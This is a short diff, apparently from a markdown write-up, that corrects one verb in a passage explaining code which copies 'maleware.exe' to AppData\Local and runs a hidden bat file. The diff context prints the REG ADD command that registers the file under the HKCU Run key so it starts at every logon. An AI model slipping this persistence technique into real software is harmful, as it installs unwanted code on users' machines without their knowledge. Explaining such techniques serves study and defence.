@@ -58,7 +58,7 @@ regString$= 'REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "My
 ReturnVal=StrToFile(batFile$,regString$,FALSE,FALSE)
 Run("batFile$","HIDE")
 ```
-This Code will copy the maleware to C:\Users\User\AppData\Local and creates and run a bat file as below:
+This Code will copy the maleware to C:\Users\User\AppData\Local and create and run a bat file as below:
 ```
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "My App" /t REG_SZ /F /D "C:\Users\user\AppData\Local\maleware.exe"
 ```
